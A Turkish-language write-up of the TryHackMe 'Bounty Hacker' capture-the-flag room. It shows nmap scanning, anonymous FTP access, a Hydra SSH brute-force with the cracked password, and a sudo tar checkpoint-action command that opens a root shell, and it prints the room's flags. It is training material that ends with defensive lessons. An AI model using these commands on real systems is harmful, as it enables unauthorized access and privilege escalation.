# 🤠 TryHackMe - Bounty Hacker CTF Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-Bounty_Hacker-red.svg?style=flat-square&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen.svg?style=flat-square)
![Category](https://img.shields.io/badge/Category-FTP_%7C_Brute--Force_%7C_GTFOBins-blue.svg?style=flat-square)

Bu doküman, TryHackMe platformundaki **Bounty Hacker** makinesinin keşif, kimlik doğrulama atlatma, parola kırma (brute-force) ve yetki yükseltme (privilege escalation) adımlarını içermektedir.

**Platform:** TryHackMe  
**Oda:** Bounty Hacker ([tryhackme.com/room/cowboyhacker](https://tryhackme.com/room/cowboyhacker))  
**Zorluk:** Kolay (Easy)  
**Kategori:** Linux / Anonymous FTP / SSH Brute-Force / Privilege Escalation (GTFOBins)  

---

## 📑 İçindekiler

1. [Keşif & Port Taraması (Reconnaissance)](#1-keşif--port-taraması-reconnaissance)
2. [Web Keşfi (HTTP - Port 80)](#2-web-keşfi-http---port-80)
3. [FTP Servisi & Anonim Giriş (Port 21)](#3-ftp-servisi--anonim-giriş-port-21)
4. [Hydra ile SSH Parola Kırma (Brute-Force)](#4-hydra-ile-ssh-parola-kırma-brute-force)
5. [Sisteme Erişim & User Flag](#5-sisteme-erişim--user-flag)
6. [Yetki Yükseltme (Privilege Escalation) & Root Flag](#6-yetki-yükseltme-privilege-escalation--root-flag)
7. [Özet Tablo & Çıkarımlar](#7-özet-tablo--çıkarımlar)
8. [Kaynaklar](#8-kaynaklar)

---

## 1. Keşif & Port Taraması (Reconnaissance)

Lab hedef makinesi ve saldırgan (Attacker) makinesi başlatıldıktan sonra, hedef sistemdeki açık portları, çalışan servis versiyonlarını ve varsayılan NSE betik çıktılarını görmek için `nmap` taraması gerçekleştirildi:

```bash
nmap -sC -sV <IP_ADDR>
```

**Açık Portlar ve Servisler:**
* `21/tcp` — **open** (FTP - *Anonymous FTP login allowed*)
* `22/tcp` — **open** (SSH - OpenSSH)
* `80/tcp` — **open** (HTTP - Apache Web Sunucusu)

---

## 2. Web Keşfi (HTTP - Port 80)

Tarayıcı üzerinden hedef makinenin web servisine gidildi:

```text
http://<IP_ADDR>
```

Ana sayfada ekip üyeleri arasındaki mesajlaşma/diyalog görüntülendi. Doğrudan bir giriş formu bulunmadığından bir sonraki adım olarak anonim erişime açık olan **FTP** servisine yönelindi.

---

## 3. FTP Servisi & Anonim Giriş (Port 21)

Nmap çıktısında ve bağlantı denemesinde FTP sunucusunun parola doğrulaması olmadan **anonim (`anonymous`)** girişe izin verdiği tespit edildi.

FTP sunucusuna bağlanmak için:

```bash
ftp <IP_ADDR>
```

* **Kullanıcı Adı:** `anonymous`
* **Parola:** `anonymous` *(veya boş bırakılarak geçilebilir)*

Sunucu içerisindeki dosyaları görmek için `ls` komutu çalıştırıldı ve iki adet metin dosyası bulundu:

```ftp
ftp> ls
locks.txt
task.txt
```

Her iki dosya da incelenmek üzere saldırgan makinesine indirildi:

```ftp
ftp> get task.txt
ftp> get locks.txt
ftp> bye
```

### Dosya İçeriklerinin Analizi

1. **`task.txt` İncelemesi:**
   ```bash
   cat task.txt
   ```
   Görev notunun altında notu yazan kişinin imzası (`-lin`) yer almaktadır. Buradan sistemdeki geçerli kullanıcı adının **`lin`** olduğu anlaşıldı.

2. **`locks.txt` İncelemesi:**
   ```bash
   cat locks.txt
   ```
   Dosya içerisinde olası parolalardan oluşan bir kelime listesi (wordlist) bulunduğu görüldü.

---

## 4. Hydra ile SSH Parola Kırma (Brute-Force)

`task.txt` dosyasından elde edilen `lin` kullanıcı adı ve `locks.txt` içerisindeki parola listesi kullanılarak **THC-Hydra** aracı ile SSH servisine (`22/tcp`) kaba kuvvet saldırısı düzenlendi:

```bash
hydra -l lin -P locks.txt ssh://<IP_ADDR>
```

* `-l lin`: Hedef kullanıcı adı.
* `-P locks.txt`: Denenecek parola listesi.
* `ssh://<IP_ADDR>`: Hedef servis ve IP adresi.

**Bulunan Kimlik Bilgileri:**
* **Kullanıcı Adı:** `lin`
* **Parola:** `RedDr4gonSynd1cat3`

---

## 5. Sisteme Erişim & User Flag

Elde edilen SSH kimlik bilgileri ile hedef makineye giriş yapıldı:

```bash
ssh lin@<IP_ADDR>
# Parola: RedDr4gonSynd1cat3
```

Başarılı girişin ardından mevcut dizindeki dosyalar listelendi ve `user.txt` bayrağı okundu:

```bash
ls -la
cat Desktop/user.txt   # veya bulunduğu dizinde: cat user.txt
```

* **User Flag:** `THM{CR1M3_SyNd1C4T3}`

---

## 6. Yetki Yükseltme (Privilege Escalation) & Root Flag

`root.txt` bayrağına ulaşmak amacıyla `/root` dizini kontrol edildiğinde standart kullanıcı yetkisi nedeniyle erişim engeli (`Permission denied`) ile karşılaşıldı.

`lin` kullanıcısının `root` yetkisiyle çalıştırabildiği komutları görmek için `sudo -l` komutu çalıştırıldı:

```bash
sudo -l
```

**Çıktı Analizi:**
Kullanıcının `/bin/tar` ikili dosyasını `sudo` ile `root` yetkisinde çalıştırabildiği görüldü:

```text
User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

### GTFOBins ile `tar` İstismarı

[GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo) üzerinden `tar` aracının `sudo` yetkisiyle nasıl etkileşimli kabuk (shell) açabileceği araştırıldı. `--checkpoint` ve `--checkpoint-action` parametreleri kullanılarak `/bin/sh` çalıştırıldı:

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Komut çalıştırıldığında `root` yetkisine sahip bir shell elde edildi:

```bash
whoami
# root

cat /root/root.txt
```

* **Root Flag:** `THM{80UN7Y_h4cK3r}`

---

## 7. Özet Tablo & Çıkarımlar

| Aşama | Bulgular / Kullanılan Yöntem | Sonuç |
| :--- | :--- | :--- |
| **Port Taraması** | `nmap -sC -sV <IP_ADDR>` | `21/ftp`, `22/ssh`, `80/http` açık |
| **FTP Keşfi** | Anonymous giriş (`anonymous:anonymous`) | `task.txt` ve `locks.txt` elde edildi |
| **Kullanıcı Tespiti** | `task.txt` içerisindeki yazar imzası | Kullanıcı adı: `lin` |
| **SSH Brute-Force** | `hydra -l lin -P locks.txt ssh://<IP_ADDR>` | Parola: `RedDr4gonSynd1cat3` |
| **User Flag** | SSH oturumu üzerinden `user.txt` okuma | `THM{CR1M3_SyNd1C4T3}` |
| **Privilege Escalation** | `sudo -l` -> `/bin/tar` (GTFOBins) | `root` shell & `THM{80UN7Y_h4cK3r}` |

### Güvenlik Çıkarımları
1. **Anonim FTP Erişimi:** Hassas notlar veya parola listeleri barındırabilecek FTP sunucularında `anonymous` erişim devre dışı bırakılmalıdır.
2. **Parola Güvenliği ve Rate-Limiting:** SSH servisinde parola tabanlı giriş yerine SSH anahtar tabanlı kimlik doğrulama tercih edilmeli ve `fail2ban` gibi araçlarla brute-force saldırıları engellenmelidir.
3. **Sudo Yetki Kısıtlaması (Least Privilege):** `tar`, `vim`, `find`, `less` gibi kabuk çalıştırma (shell escape) yeteneği bulunan sistem araçlarına gereksiz `sudo` yetkisi verilmemelidir.

---

## 8. Kaynaklar

- [TryHackMe — Bounty Hacker Odası](https://tryhackme.com/room/cowboyhacker)
- [GTFOBins — tar (Sudo)](https://gtfobins.github.io/gtfobins/tar/#sudo)

